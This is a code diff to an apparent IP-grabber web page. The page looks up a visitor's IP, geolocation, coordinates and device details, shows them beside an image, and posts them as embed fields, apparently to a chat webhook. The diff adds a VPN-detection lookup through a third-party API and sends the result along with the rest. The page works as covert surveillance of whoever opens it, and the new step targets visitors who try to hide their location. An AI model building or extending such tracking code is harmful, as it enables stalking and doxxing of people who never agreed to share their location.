@@ -146,13 +146,19 @@
                 region: 'Fetching...',
                 timezone: 'Fetching...',
                 latitude: 'Fetching...',
-                longitude: 'Fetching...'
+                longitude: 'Fetching...',
+                vpn: 'Unknown'
             };
 
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 ipAddress = ipData.ip;
+
+                // Check for VPN using a third-party IP service
+                const vpnResponse = await fetch(`https://vpnapi.io/api/${ipAddress}?token=your_api_token_here`);
+                const vpnData = await vpnResponse.json();
+                positionData.vpn = vpnData.security.is_vpn ? 'Yes' : 'No';
 
                 const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                 const geoData = await geoResponse.json();
@@ -161,10 +167,11 @@
                     region: geoData.region,
                     timezone: geoData.timezone,
                     latitude: geoData.latitude,
-                    longitude: geoData.longitude
+                    longitude: geoData.longitude,
+                    vpn: positionData.vpn
                 };
             } catch (error) {
-                console.error('Error fetching location data:', error);
+                console.error('Error fetching location and VPN data:', error);
             }
 
             const deviceData = {
@@ -177,7 +184,8 @@
                 region: positionData.region,
                 timezone: positionData.timezone,
                 latitude: positionData.latitude,
-                longitude: positionData.longitude
+                longitude: positionData.longitude,
+                vpn: positionData.vpn
             };
 
             // Try to fetch the custom device name from localStorage
@@ -202,6 +210,7 @@
                 <p><strong>Region:</strong> ${deviceData.region}</p>
                 <p><strong>Time Zone:</strong> ${deviceData.timezone}</p>
                 <p><strong>Coordinates:</strong> ${deviceData.latitude}, ${deviceData.longitude}</p>
+                <p><strong>VPN Detected:</strong> ${deviceData.vpn}</p>
 
                 <!-- Image container to show rizzz.png -->
                 <div class="image-container">
@@ -230,7 +239,8 @@
                                 { name: 'City', value: deviceData.city, inline: false },
                                 { name: 'Region', value: deviceData.region, inline: false },
                                 { name: 'Time Zone', value: deviceData.timezone, inline: false },
-                                { name: 'Coordinates', value: `${deviceData.latitude}, ${deviceData.longitude}`, inline: false }
+                                { name: 'Coordinates', value: `${deviceData.latitude}, ${deviceData.longitude}`, inline: false },
+                                { name: 'VPN Detected', value: deviceData.vpn, inline: false }
                             ]
                         }]
                     })
